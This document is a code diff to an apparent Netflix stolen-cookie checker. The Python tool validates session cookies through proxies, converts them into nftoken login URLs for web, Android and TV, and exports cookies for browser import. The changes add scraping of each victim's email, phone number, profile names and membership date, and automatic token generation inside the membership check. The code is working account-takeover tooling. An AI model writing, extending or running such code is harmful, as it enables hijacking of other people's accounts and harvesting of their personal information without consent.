@@ -398,8 +398,10 @@ def generate_nftoken(cookie_text, use_proxy=True):
                 exp_str = datetime.fromtimestamp(ts).strftime("%Y-%m-%d %H:%M:%S")
 
             token_url = f"https://netflix.com/?nftoken={token}"
+            android_url = f"https://netflix.com/unsupported?nftoken={token}"
+            tv_url = f"https://netflix.com/tv2?nftoken={token}"
             save_history("nftoken", "LIVE", route=route, token_url=token_url, raw_cookie=cookie_text)
-            return token_url, exp_str, route
+            return token_url, android_url, tv_url, token, exp_str, route
 
         except Exception as e:
             last_err = e
@@ -451,20 +453,51 @@ def check_netflix_membership(cookie_text, use_proxy=True):
             html = r.text
             plan_detected = 'Live (Standard/Basic)'
             if re.search(r'4K video resolution[^<]*?(?:spatial audio|ad-free)', html, re.I) or 'Premium' in html:
-                plan_detected = 'Premium 4K'
+                plan_detected = 'PREMIUM (ULTRA HD)'
             else:
                 plan_match = re.search(r'data-uia="account-membership-page\+plan-card\+title"[^>]*>([^<]{1,30}?)<', html)
                 if plan_match:
                     plan_detected = plan_match.group(1).strip()
 
+            # Extract user email
+            email_match = re.search(r'"userEmail"\s*:\s*"([^"]+)"', html)
+            if not email_match:
+                email_match = re.search(r'data-uia="account-email"[^>]*>([^<]+)<', html)
+            email = email_match.group(1).strip() if email_match else 'Account Valid'
+
+            # Extract phone
+            phone_match = re.search(r'"phoneNumber"\s*:\s*"([^"]+)"', html)
+            if not phone_match:
+                phone_match = re.search(r'data-uia="account-phone"[^>]*>([^<]+)<', html)
+            phone = phone_match.group(1).strip() if phone_match else 'None'
+
+            # Extract profiles
+            profiles = []
+            for pm in re.finditer(r'"profileName"\s*:\s*"([^"]+)"', html):
+                p_name = pm.group(1).encode().decode('unicode_escape', errors='ignore')
+                if p_name not in profiles:
+                    profiles.append(p_name)
+
             date_match = re.search(
                 r'data-uia="account-membership-page\+payments-card\+title"[^>]*>Next payment</h3>[^<]*<p[^>]*data-uia="account-membership-page\+payments-card\+description"[^>]*>([^<]+?)</p>',
                 html, re.DOTALL | re.I
             )
-            billing = date_match.group(1).strip() if date_match else 'N/A'
+            billing = date_match.group(1).strip() if date_match else 'Auto-renew active'
+
+            # Member since
+            member_since_match = re.search(r'"memberSince"\s*:\s*"([^"]+)"', html)
+            member_since = member_since_match.group(1).strip() if member_since_match else 'Active'
 
             country_match = re.search(r'"(?:countryOfSignup|currentCountry|memberCountry|geoCountry)"\s*:\s*"([A-Za-z]{2})"', html)
             country = normalize_country(country_match.group(1)) if country_match else 'Unknown'
+
+            # Try generating nftoken simultaneously if possible
+            nftoken_data = None
+            try:
+                t_url, a_url, tv_url, tok, exp, _ = generate_nftoken(cookie_text, use_proxy=False)
+                nftoken_data = {"url": t_url, "android_url": a_url, "tv_url": tv_url, "token": tok, "expires": exp}
+            except Exception:
+                pass
 
             editor_cookies = [
                 {"domain": ".netflix.com", "name": k, "path": "/", "secure": True, "httpOnly": True, "value": v}
@@ -475,10 +508,15 @@ def check_netflix_membership(cookie_text, use_proxy=True):
 
             return {
                 "live": True,
+                "email": email,
+                "phone": phone,
                 "plan": plan_detected,
                 "billing": billing,
+                "member_since": member_since,
+                "profiles": profiles,
                 "country": country,
                 "cookies": editor_cookies,
+                "token_data": nftoken_data,
                 "route": route
             }
         except Exception as e:
@@ -628,8 +666,15 @@ class Handler(http.server.BaseHTTPRequestHandler):
         elif self.path == "/api/token":
             try:
                 p = json.loads(body.decode("utf-8"))
-                url, exp, route = generate_nftoken(p.get("cookie", ""), use_proxy=p.get("use_proxy", True))
-                res = json.dumps({"url": url, "expires": exp, "route": route}).encode("utf-8")
+                token_url, android_url, tv_url, token, exp, route = generate_nftoken(p.get("cookie", ""), use_proxy=p.get("use_proxy", True))
+                res = json.dumps({
+                    "url": token_url,
+                    "android_url": android_url,
+                    "tv_url": tv_url,
+                    "token": token,
+                    "expires": exp,
+                    "route": route
+                }).encode("utf-8")
                 self.send_response(200)
             except Exception as e:
                 res = json.dumps({"error": str(e)}).encode("utf-8")
